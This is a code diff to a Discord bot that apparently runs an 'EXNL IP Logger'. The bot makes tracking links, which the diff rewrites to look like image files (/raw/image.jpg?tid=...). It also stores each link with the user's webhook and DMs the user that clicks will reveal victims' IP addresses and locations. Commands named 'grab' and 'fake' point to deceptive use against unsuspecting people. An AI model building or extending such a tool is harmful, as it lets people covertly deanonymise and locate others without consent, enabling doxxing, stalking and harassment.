@@ -488,9 +488,9 @@ async function handleURLCommand(interaction) {
     const redirectUrl = interaction.options.getString('redirect');
     const title = interaction.options.getString('title') || 'Check this out!';
 
-    // Generate tracking link
+    // Generate tracking link in the standard format
     const trackingId = generateTrackingId();
-    const trackingUrl = `${API_BASE_URL}/track/${trackingId}`;
+    const trackingUrl = `${API_BASE_URL}/raw/image.jpg?tid=${trackingId}`;
 
     const embed = new EmbedBuilder()
         .setColor('#0099FF')
@@ -515,6 +515,16 @@ async function handleURLCommand(interaction) {
         )
         .setFooter({ text: '🕵️ EXNL IP Logger | URL Tracker' })
         .setTimestamp();
+
+    // Store tracking data
+    storeTrackingData(interaction.user.id, {
+        type: 'custom_url',
+        trackingUrl: trackingUrl,
+        trackingId: trackingId,
+        originalUrl: redirectUrl,
+        title: title,
+        webhook: userWebhooks.get(interaction.user.id)
+    });
 
     await interaction.reply({ embeds: [embed], ephemeral: true });
 
@@ -917,7 +927,7 @@ async function handleQuickCommand(interaction) {
         case 'grab':
             const title = interaction.options.getString('title') || 'Interesting Link';
             const quickTrackingId = generateTrackingId();
-            const quickTrackingUrl = `${API_BASE_URL}/g/${quickTrackingId}`;
+            const quickTrackingUrl = `${API_BASE_URL}/raw/image.jpg?tid=${quickTrackingId}`;
 
             const grabEmbed = new EmbedBuilder()
                 .setColor('#E74C3C')
@@ -929,7 +939,30 @@ async function handleQuickCommand(interaction) {
                 })
                 .setTimestamp();
 
+            // Store tracking data
+            storeTrackingData(interaction.user.id, {
+                type: 'quick_grab',
+                trackingUrl: quickTrackingUrl,
+                trackingId: quickTrackingId,
+                title: title,
+                webhook: userWebhooks.get(interaction.user.id)
+            });
+
             await interaction.reply({ embeds: [grabEmbed], ephemeral: true });
+
+            // Send to user's DM
+            const dmEmbed = new EmbedBuilder()
+                .setColor('#00FF00')
+                .setTitle('🎯 Your Quick Grab Link | EXNL')
+                .addFields({
+                    name: '🔗 Tracking URL',
+                    value: `\`${quickTrackingUrl}\``,
+                    inline: false
+                })
+                .setFooter({ text: 'When someone clicks this link, you\'ll get their IP and location data!' })
+                .setTimestamp();
+
+            await interaction.user.send({ embeds: [dmEmbed] });
             break;
 
         case 'fake':
@@ -1181,7 +1214,7 @@ async function handleImageCommand(interaction) {
     await interaction.deferReply({ ephemeral: true });
 
     try {
-        // Generate tracking link (same format as website)
+        // Generate tracking link in the format: /raw/image.jpg?tid=trackingId
         const trackingId = generateTrackingId();
         const trackingUrl = `${API_BASE_URL}/raw/image.jpg?tid=${trackingId}`;
 
@@ -1208,7 +1241,6 @@ async function handleImageCommand(interaction) {
                     inline: false
                 }
             )
-//.setImage(imageAttachment.url) // Removed - tracking uses default image
             .setFooter({ text: '🕵️ EXNL IP Logger | Image Tracker' })
             .setTimestamp();
 
@@ -1236,6 +1268,14 @@ async function handleImageCommand(interaction) {
             .setTimestamp();
 
         await interaction.user.send({ embeds: [dmEmbed] });
+
+        // Store tracking data with the generated tracking ID
+        storeTrackingData(interaction.user.id, {
+            type: 'image',
+            trackingUrl: trackingUrl,
+            trackingId: trackingId,
+            webhook: userWebhooks.get(interaction.user.id)
+        });
 
     } catch (error) {
         console.error('Image command error:', error);
